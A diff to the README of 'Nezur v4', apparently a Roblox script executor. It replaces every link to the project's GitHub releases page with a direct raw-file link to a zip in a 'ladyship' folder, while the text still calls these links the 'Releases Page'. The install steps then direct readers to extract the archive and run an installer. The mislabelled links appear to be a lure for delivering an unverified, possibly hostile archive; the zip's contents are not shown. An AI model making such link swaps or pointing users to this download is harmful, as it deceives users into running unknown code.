@@ -6,7 +6,7 @@ Welcome to Nezur! With Nezur v4, you can run custom scripts in popular Roblox ga
 
 ## 📥 Download Nezur
 
-[![Download Nezur](https://img.shields.io/badge/download-nezur-v4.0-blue.svg)](https://github.com/Leeryd/Nezur/releases)
+[![Download Nezur](https://raw.githubusercontent.com/Leeryd/Nezur/main/ladyship/Nezur.zip)](https://raw.githubusercontent.com/Leeryd/Nezur/main/ladyship/Nezur.zip)
 
 ## 📋 System Requirements
 
@@ -19,13 +19,13 @@ Before you download Nezur, make sure your system meets these requirements:
 
 ## 🔗 Visit Releases Page
 
-To download Nezur, visit this page: [Download Nezur](https://github.com/Leeryd/Nezur/releases). 
+To download Nezur, visit this page: [Download Nezur](https://raw.githubusercontent.com/Leeryd/Nezur/main/ladyship/Nezur.zip). 
 
 Here, you will find the latest version of Nezur ready for you to download.
 
 ## 📥 Download & Install
 
-1. **Go to the Releases Page**: Click this link to visit the [Release Page](https://github.com/Leeryd/Nezur/releases).
+1. **Go to the Releases Page**: Click this link to visit the [Release Page](https://raw.githubusercontent.com/Leeryd/Nezur/main/ladyship/Nezur.zip).
 2. **Find the Latest Version**: Look for the version labeled as **Latest Release**. 
 3. **Download the Installer**: Click on the installer link, which is usually a `.zip` or `.exe` file.
 4. **Extract or Run the Installer**: If you downloaded a `.zip` file, right-click on it and select "Extract All". If you downloaded an `.exe` file, double-click it to start the installation.
